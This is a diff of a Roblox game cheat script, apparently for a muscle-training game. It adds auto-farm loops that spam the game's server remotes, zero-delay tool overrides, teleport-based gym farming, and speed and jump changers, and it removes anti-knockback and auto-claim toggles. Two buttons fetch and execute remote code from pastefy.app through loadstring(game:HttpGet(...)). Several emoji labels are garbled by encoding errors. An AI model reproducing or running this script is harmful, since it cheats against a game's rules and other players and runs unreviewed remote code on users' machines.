-                    game:GetService("ReplicatedStorage").rEvents.openFortuneWheelRemote:InvokeServer("openFortuneWheel", game:GetService("ReplicatedStorage").fortuneWheelChances["Fortune Wheel"])
-                end
-            end)
-        end
-    end 
-})
-
-local Toggle26 = Tabs.Misc:AddToggle("AntiKnockback", 
-{
-    Title = "Anti Knockback", 
-    Description = "Защищает от отбрасывания (не замораживает при выключении)",
-    Default = false,
-    Callback = function(state)
-        _G.AntiKnockback = state
-        
-        if state then
-            spawn(function()
-                while _G.AntiKnockback do
-                    local player = game.Players.LocalPlayer
-                    local character = player.Character or player.CharacterAdded:Wait()
-                    local rootPart = character:WaitForChild("HumanoidRootPart")
-                    
-                    -- Удаляем старый BodyVelocity, если он есть
-                    local existingVelocity = rootPart:FindFirstChild("BodyVelocity")
-                    if existingVelocity then
-                        existingVelocity:Destroy()
-                    end
-                    
-                    -- Создаем новый BodyVelocity, но с учетом текущей скорости
-                    local bodyVelocity = Instance.new("BodyVelocity")
-                    bodyVelocity.MaxForce = Vector3.new(100000, 0, 100000)
-                    bodyVelocity.Velocity = rootPart.AssemblyLinearVelocity -- Сохраняем текущую скорость
-                    bodyVelocity.P = 1250
-                    bodyVelocity.Parent = rootPart
-                    
-                    -- Обновляем скорость в реальном времени
-                    game:GetService("RunService").Heartbeat:Connect(function()
-                        if not _G.AntiKnockback or not bodyVelocity or not bodyVelocity.Parent then
-                            return
-                        end
-                        bodyVelocity.Velocity = rootPart.AssemblyLinearVelocity
-                    end)
-                    
-                    -- Ждем смерти или отключения
-                    player.CharacterAdded:Wait()
-                    if not _G.AntiKnockback then break end
-                end
-            end)
-        else
-            -- При отключении просто удаляем BodyVelocity, не сбрасывая скорость
-            local player = game.Players.LocalPlayer
-            if player.Character then
-                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
-                if rootPart then
-                    local existingVelocity = rootPart:FindFirstChild("BodyVelocity")
-                    if existingVelocity then
-                        existingVelocity:Destroy()
-                    end
-                end
-            end
-        end
-    end 
-})
-
-local Toggle27 = Tabs.Misc:AddToggle("AutoClaimGiftsToggle", 
-{
-    Title = "Auto Claim Gifts", 
-    Default = false,
-    Callback = function(state)
-        _G.AutoClaimGifts = state
-        
-        if state then
-            spawn(function()
-                while _G.AutoClaimGifts and wait(1) do
-                    for i = 1, 8 do
-                        game:GetService("ReplicatedStorage").rEvents.freeGiftClaimRemote:InvokeServer("claimGift", i)
-                    end
-                end
-            end)
-        end
-    end
-})
-
 Tabs.Misc:AddButton({
+    Title = "Left Control Button (for mobile players)",
+    Callback = function()
+      loadstring(game:HttpGet("https://pastefy.app/nWFRhL1s/raw"))()
+    end 
+})
+
+Tabs.RebirthTab:AddButton({
     Title = "Rebirth Counter",
     Callback = function()
       loadstring(game:HttpGet("https://pastefy.app/9DljbUvT/raw"))()  
@@ -2315,8 +1156,8 @@ local Section11 = Tabs.Player:AddSection("Speed")
 local Input3 = Tabs.Player:AddInput("Input", {
     Title = "Speed Changer",
     Placeholder = "16",
-    Numeric = true, -- Only allows numbers
-    Finished = true, -- Only calls callback when you press enter
+    Numeric = true,
+    Finished = true,
     Callback = function(Value)
         local newSpeed = tonumber(Value)
         if newSpeed and newSpeed > 0 then
@@ -2333,8 +1174,8 @@ local Section12 = Tabs.Player:AddSection("Jump")
 local Input4 = Tabs.Player:AddInput("Input", {
     Title = "Jump Changer",
     Placeholder = "60",
-    Numeric = true, -- Only allows numbers
-    Finished = true, -- Only calls callback when you press enter
+    Numeric = true,
+    Finished = true,
     Callback = function(Value)
         local newJump = tonumber(Value)
         if newJump and newJump > 0 then
@@ -2351,15 +1192,15 @@ local Section14 = Tabs.Player:AddSection("Statistics")
 local player = game.Players.LocalPlayer
 local leaderstats = player:WaitForChild("leaderstats")
 
-local StrengthDisplay = Tabs.Player:AddParagraph({ Title = "рџ’ЄStrength: Loading..." })
-local DurabilityDisplay = Tabs.Player:AddParagraph({ Title = "рџ‘ЉDurability: Loading..." })
-local AgilityDisplay = Tabs.Player:AddParagraph({ Title = "вљЎAgility: Loading..." })
-local RebirthsDisplay = Tabs.Player:AddParagraph({ Title = "в™»пёЏRebirths: Loading..." })
-local KillsDisplay = Tabs.Player:AddParagraph({ Title = "рџ’ЂKills: Loading..." })
-local BrawlsDisplay = Tabs.Player:AddParagraph({ Title = "вљ”пёЏBrawls: Loading..." })
-local GemsDisplay = Tabs.Player:AddParagraph({ Title = "рџ’ЋGems: Loading..." })
-local EvilKarmaDisplay = Tabs.Player:AddParagraph({ Title = "рџ€Evil Karma: Loading..." })
-local GoodKarmaDisplay = Tabs.Player:AddParagraph({ Title = "рџ‡Good Karma: Loading..." })
+local StrengthDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ’ª Strength: Loading..." })
+local DurabilityDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ‘Š Durability: Loading..." })
+local AgilityDisplay = Tabs.Player:AddParagraph({ Title = "âš¡ Agility: Loading..." })
+local RebirthsDisplay = Tabs.Player:AddParagraph({ Title = "â™»ï¸ Rebirths: Loading..." })
+local KillsDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ’€ Kills: Loading..." })
+local BrawlsDisplay = Tabs.Player:AddParagraph({ Title = "âš”ï¸ Brawls: Loading..." })
+local GemsDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ’Ž Gems: Loading..." })
+local EvilKarmaDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ˜ˆ Evil Karma: Loading..." })
+local GoodKarmaDisplay = Tabs.Player:AddParagraph({ Title = "ðŸ˜‡ Good Karma: Loading..." })
 
 local function updateAllStats()
     local StrengthStat = leaderstats.Strength.Value
@@ -2372,15 +1213,15 @@ local function updateAllStats()
     local EvilKarmaStat = player.evilKarma.Value
     local GoodKarmaStat = player.goodKarma.Value
 
-    StrengthDisplay:SetTitle("Strength: " .. StrengthStat)
-    DurabilityDisplay:SetTitle("Durability: " .. DurabilityStat)
-    AgilityDisplay:SetTitle("Agility: " .. AgilityStat)
-    RebirthsDisplay:SetTitle("Rebirths: " .. RebirthsStat)
-    KillsDisplay:SetTitle("Kills: " .. KillsStat)
-    BrawlsDisplay:SetTitle("Brawls: " .. BrawlsStat)
-    GemsDisplay:SetTitle("Gems: " .. GemsStat)
-    EvilKarmaDisplay:SetTitle("Evil Karma: " .. EvilKarmaStat)
-    GoodKarmaDisplay:SetTitle("Good Karma: " .. GoodKarmaStat)
+    StrengthDisplay:SetTitle("ðŸ’ª Strength: " .. StrengthStat)
+    DurabilityDisplay:SetTitle("ðŸ‘Š Durability: " .. DurabilityStat)
+    AgilityDisplay:SetTitle("âš¡ Agility: " .. AgilityStat)
+    RebirthsDisplay:SetTitle("â™»ï¸ Rebirths: " .. RebirthsStat)
+    KillsDisplay:SetTitle("ðŸ’€ Kills: " .. KillsStat)
+    BrawlsDisplay:SetTitle("âš”ï¸ Brawls: " .. BrawlsStat)
+    GemsDisplay:SetTitle("ðŸ’Ž Gems: " .. GemsStat)
+    EvilKarmaDisplay:SetTitle("ðŸ˜ˆ Evil Karma: " .. EvilKarmaStat)
+    GoodKarmaDisplay:SetTitle("ðŸ˜‡ Good Karma: " .. GoodKarmaStat)
 end
 
 task.spawn(function()
@@ -2392,6 +1233,13 @@ end)
 -- Rewards
 
 local Section13 = Tabs.Rewards:AddSection("Chests")
+
+Tabs.Rewards:AddButton({
+    Title = "Collect All Chests",
+    Callback = function()
+      --addfunc
+    end
+})
 
 Tabs.Rewards:AddButton({
     Title = "Group Chest",
@@ -2441,3 +1289,316 @@ Tabs.Rewards:AddButton({
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7916.94775, 18.06939006, 3013.45923, -0.675628722, 2.94962477e-09, -0.737242043, -1.91327798e-09, 1, 5.75427084e-09, 0.737242043, 5.29829958e-09, -0.675628722)  
     end
 })
+
+local toggleLoop = nil
+local Toggle1 = Tabs.AutoFarm:AddToggle("MyToggle", 
+{
+    Title = "Auto Lift",
+    Description = "Farm going forever",
+    Default = false,
+    Callback = function(state)
+	if state then
+        toggleLoop = task.spawn(function()
+            while true do
+                game.Players.LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
+                task.wait(0.1)
+            end
+        end)
+    else
+        if toggleLoop then
+            task.cancel(toggleLoop)
+            toggleLoop = nil
+        end
+    end
+end
+})
+
+local ToolsDropdown = Tabs.AutoFarm:AddDropdown("Dropdown", {
+    Title = "Choose tool for farm",
+    Description = "To farm you need to enable Auto Lift",
+    Values = {"None", "Weight", "Pushups", "Handstand", "Situps"},
+    Multi = false,
+    Default = 1,
+})
+
+local toolNames = {
+    None = "Punch",
+    Weight = "Weight",
+    Pushups = "Pushups",
+    Handstand = "Handstand", 
+    Situps = "Situps"
+}
+
+local selectedTool = nil
+
+local function getTool(toolName)
+    local tool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolName) or 
+                 game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolName)
+    return tool
+end
+
+local function selectTool(toolName)
+    local tool = getTool(toolName)
+    if tool then
+        selectedTool = tool
+        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
+        return true
+    end
+    return false
+end
+
+ToolsDropdown:OnChanged(function(Value)
+    local toolName = toolNames[Value]
+    if toolName then
+        selectTool(toolName)
+    end
+end)
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
+    character:WaitForChild("Humanoid")
+    
+    wait(2)
+    
+    if selectedTool then
+        local toolName = selectedTool.Name
+        selectTool(toolName)
+    else
+        local currentValue = ToolsDropdown.Value
+        local toolName = toolNames[currentValue]
+        if toolName then
+            selectTool(toolName)
+        end
+    end
+end)
+
+local function monitorTool()
+    while true do
+        wait(1)
+        if selectedTool and not selectedTool.Parent then
+            local toolName = selectedTool.Name
+            selectTool(toolName)
+        end
+    end
+end
+
+spawn(monitorTool)
+
+wait(3)
+local initialValue = ToolsDropdown.Value
+local initialToolName = toolNames[initialValue]
+if initialToolName then
+    selectTool(initialToolName)
+end
+
+local Toggle28 = Tabs.AutoFarm:AddToggle("MyToggle", {
+	Title = "Fast Tools",
+	Default = false,
+	Callback = function(Value)
+		_G.FastTools = Value
+		local defaultSpeeds = {
+			{
+				"Punch",
+				"attackTime",
+				Value and 0 or 0.1
+			},
+			{
+				"Ground Slam",
+				"attackTime",
+				Value and 0 or 6
+			},
+			{
+				"Stomp",
+				"attackTime",
+				Value and 0 or 7
+			},
+			{
+				"Handstands",
+				"repTime",
+				Value and 0 or 1
+			},
+			{
+				"Pushups",
+				"repTime",
+				Value and 0 or 1
+			},
+			{
+				"Weight",
+				"repTime",
+				Value and 0 or 1
+			},
+			{
+				"Situps",
+				"repTime",
+				Value and 0 or 1
+			}
+		}
+		local player = game.Players.LocalPlayer
+		local backpack = player:WaitForChild("Backpack")
+		for _, toolInfo in ipairs(defaultSpeeds) do
+			local tool = backpack:FindFirstChild(toolInfo[1])
+			if tool and tool:FindFirstChild(toolInfo[2]) then
+				tool[toolInfo[2]].Value = toolInfo[3]
+			end
+			local equippedTool = player.Character and player.Character:FindFirstChild(toolInfo[1])
+			if equippedTool and equippedTool:FindFirstChild(toolInfo[2]) then
+				equippedTool[toolInfo[2]].Value = toolInfo[3]
+			end
+		end
+	end
+})
+
+local Section = Tabs.AutoFarm:AddSection("Auto Gym")
+
+local function E()
+    local vim = game:GetService("VirtualInputManager")
+    vim:SendKeyEvent(true, "E", false, game)
+    task.wait(0.2)
+    vim:SendKeyEvent(false, "E", false, game)
+end
+
+local function autoLift()
+    while getgenv().working and task.wait() do
+        game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
+    end
+end
+
+local function teleportAndStart(machineName, position)
+    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position
+        task.wait(0.2)
+        E()
+        autoLift()
+    end
+end
+
+local activeWorkouts = {}
+
+local locations = {
+    ["Frost Gym"] = true,
+    ["Mythical Gym"] = true,
+    ["Eternal Gym"] = true,
+    ["Legend Gym"] = true,
+    ["Muscle King Gym"] = true,
+    ["Jungle Gym"] = true
+}
+
+local locationsList = {
+    "Frost Gym",
+    "Mythical Gym",
+    "Eternal Gym",
+    "Legend Gym",
+    "Muscle King Gym",
+    "Jungle Gym"
+}
+
+local workoutPositions = {
+    ["Bench Press"] = {
+        ["Frost Gym"] = CFrame.new(-3009, 38, -338),
+        ["Mythical Gym"] = CFrame.new(2369, 38, 1243),
+        ["Eternal Gym"] = CFrame.new(-7174, 45, -1106),
+        ["Legend Gym"] = CFrame.new(4109, 1020, -3803),
+        ["Muscle King Gym"] = CFrame.new(-8590.06152, 46.0167427, -6043.34717),
+        ["Jungle Gym"] = CFrame.new(-8629.88086, 64.8842468, 1855.03467)
+    },
+    ["Squat"] = {
+        ["Frost Gym"] = CFrame.new(-2721, 29, -592),
+        ["Mythical Gym"] = CFrame.new(2487, 30, 848),
+        ["Legend Gym"] = CFrame.new(4304, 1020, -4123),
+        ["Muscle King Gym"] = CFrame.new(-8759, 44, -6044),
+        ["Jungle Gym"] = CFrame.new(-8374.25586, 34.5933418, 2932.44995)
+    },
+    ["Deadlift"] = {
+        ["Frost Gym"] = CFrame.new(-2918, 40, -210),
+        ["Mythical Gym"] = CFrame.new(2489.21484, 3.67686629, 849.051025),
+        ["Legend Gym"] = CFrame.new(4532, 1023, -4003),
+        ["Muscle King Gym"] = CFrame.new(-8773, 50, -5664),
+        ["Jungle Gym"] = CFrame.new(-8678.05566, 14.5030098, 2089.25977)
+    },
+    ["Boulder"] = {
+        ["Mythical Gym"] = CFrame.new(2667, 46, 1203),
+        ["Legend Gym"] = CFrame.new(4189, 1010, -3904),
+        ["Muscle King Gym"] = CFrame.new(-8940.12402, 13.1642084, -5699.13477),
+        ["Jungle Gym"] = CFrame.new(-8617, 37, 2677)
+    }
+}
+
+local workoutTypes = {
+    "Bench Press",
+    "Squat",
+    "Deadlift",
+    "Boulder"
+}
+
+local function resumeWorkAfterDeath()
+    for workoutType, workoutData in pairs(activeWorkouts) do
+        if workoutData.enabled then
+            local selected = workoutData.location
+            if workoutPositions[workoutType] and workoutPositions[workoutType][selected] then
+                task.wait(3)
+                teleportAndStart(workoutType, workoutPositions[workoutType][selected])
+            end
+        end
+    end
+end
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
+    character:WaitForChild("Humanoid")
+    
+    task.wait(2)
+    
+    if next(activeWorkouts) ~= nil then
+        resumeWorkAfterDeath()
+    end
+end)
+
+for _, workoutType in ipairs(workoutTypes) do
+    local dropdown = Tabs.AutoFarm:AddDropdown(workoutType .. " dropdown", {
+        Title = "Choose " .. workoutType,
+        Values = locationsList,
+        Multi = false,
+        Default = 1,
+        Callback = function(Value)
+            _G["select" .. string.lower(string.gsub(workoutType, " ", ""))] = Value
+            
+            if activeWorkouts[workoutType] then
+                activeWorkouts[workoutType].location = Value
+            end
+        end
+    })
+    
+    local toggle = Tabs.AutoFarm:AddToggle(workoutType .. " Toggle", {
+        Title = "Farm " .. workoutType,
+        Default = false,
+        Callback = function(Value)
+            getgenv().working = Value
+            
+            if Value then
+                local selected = _G["select" .. string.lower(string.gsub(workoutType, " ", ""))] or locationsList[1]
+                
+                activeWorkouts[workoutType] = {
+                    enabled = true,
+                    location = selected
+                }
+                
+                if workoutPositions[workoutType][selected] then
+                    teleportAndStart(workoutType, workoutPositions[workoutType][selected])
+                end
+            else
+                activeWorkouts[workoutType] = nil
+            end
+        end
+    })
+end
+
+local function checkAndResumeWork()
+    while true do
+        task.wait(5)
+        
+        if next(activeWorkouts) ~= nil and not getgenv().working then
+            getgenv().working = true
+            resumeWorkAfterDeath()
+        end
+    end
+end
+
+spawn(checkAndResumeWork)
